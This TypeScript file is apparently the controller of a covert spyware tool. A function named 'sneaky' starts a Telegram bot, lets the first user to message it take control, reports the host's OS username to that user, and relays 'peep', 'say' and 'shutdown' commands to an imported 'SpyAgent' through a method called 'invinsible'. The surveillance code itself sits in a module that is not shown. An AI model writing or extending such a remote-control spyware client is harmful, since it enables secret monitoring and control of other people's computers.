import { Telegraf } from 'telegraf';
import os from 'os';
import SpyAgent from './spyAgent';
import { Action } from './types';

const eventsToHandle = ['SIGTERM', 'SIGINT', 'unhandledRejection', 'uncaughtException', 'SIGUSR2'];

async function sneaky() {
    const bot = new Telegraf(process.env.BOT_TOKEN!);

    const agent = new SpyAgent(bot);

    bot.start((ctx) => {
        ctx.reply('Welcome sir,Wanna say Hello 😃?');
    });

    bot.command('peep', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0],
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('say', (ctx) => {
        const { message: { text } } = ctx.update;
        const parts = text.split('+');
        const action: Action = {
            command: parts[0],
            text: parts[1]
        };
        agent.invinsible(action);
    });

    bot.command('shutdown', (ctx) => {
        const { message: { text } } = ctx.update;
        const action: Action = {
            command: text
        };
        agent.invinsible(action);
    });

    bot.on('message', (ctx) => {
        if (agent.isAnonymous()) ctx.reply('agent007 at your service sir.')
        if (agent.isAnonymous()) agent.setUser = ctx.from.id.toString();
    });

    bot.launch();
    if (!agent.isAnonymous()) agent.whichUser(os.userInfo().username);

    eventsToHandle.forEach((e) => process.on(e, (err) => {
        agent.die();
        console.log(err);
        return process.exit();
    }));


};

sneaky();